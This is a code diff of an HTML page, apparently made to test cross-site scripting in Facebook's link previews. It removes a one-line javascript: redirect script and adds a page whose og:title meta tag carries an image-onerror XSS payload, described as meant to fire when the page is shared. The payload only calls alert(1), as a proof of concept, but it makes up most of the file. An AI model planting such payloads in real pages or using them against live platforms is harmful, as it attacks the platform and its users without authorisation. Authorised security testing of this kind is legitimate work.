@@ -1,1 +1,15 @@
-<script>window.location="javascript:alert(1)";</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="<img src='x' onerror='alert(1)'/>">
+    <meta property="og:description" content="This is a test for XSS payload in Facebook's link preview">
+    <title>XSS Test</title>
+</head>
+<body>
+    <h1>Test XSS with Open Graph Tags</h1>
+    <p>If this page is shared on Facebook, it should trigger XSS in the link preview.</p>
+</body>
+</html>
